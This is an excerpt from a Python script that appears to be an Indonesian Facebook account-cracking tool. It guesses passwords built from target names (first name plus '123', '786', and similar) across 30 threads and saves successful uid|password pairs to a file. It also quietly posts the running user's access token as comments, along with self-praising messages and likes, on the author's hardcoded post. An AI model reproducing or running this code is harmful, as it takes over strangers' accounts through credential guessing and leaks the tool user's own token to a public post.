...
Author    = 'Niki'
Facebook  = 'facebook.com/100000146759213'
Instagram = 'Instagram.com' 
Whatsapp  = '081388498596'
YouTube   = 'Youtube.com'
Syafii  = 100000146759213
Postingan = 5742476792433822
...
komtwol = random.choice(['ANJAY SLEMEX LORD NIKI GANTENG ', 'NIKI JR ', 'BANH KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
kartu2d = random.choice(["LU GANTENG BANH TAPI SAYANG KEK HENGKER", "PRISTYLE DULU BOSSS HENGKER ","AHAHAHAHHA BANYAK KANG RECOD AWAS BANG "])
kon = random.choice(["HACKER  XXXX :)"])
def ___fii___Sayang___Kamu___Widiya___():
    try:
        ...
        komentar = komtwol
        pipp = kartu2d
        post = '5742476792433822'
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/5742476792433822/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/5742476792433822/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/5742476792433822/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/5742476792433822/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/5742476792433822/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/5742476792433822/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/5742476792433822/likes?summary=true&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/5742476792433822/likes?summary=true&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/5742476792433822/likes?summary=true&access_token=' + (token),cookies=cookie)
...
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 5.1.1; SM-J105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36"
					...
					if ter in ["m","M"]:
						...
						with ThreadPoolExecutor(max_workers=30) as coeg:
							...
							for user in id:
								...
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"786", frist[0]+"1234" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"786", frist[0]+"1234" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"786", frist[0]+"1234" ]
								else:
									fii = [ "pakistan", "pakistan123", "786786", "786786786" ]
    ...
    for pw in fii:
        ...
        if "session_key" in send.text and "EAAA" in send.text:
            ...
            try:
                ...
                open("OK/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
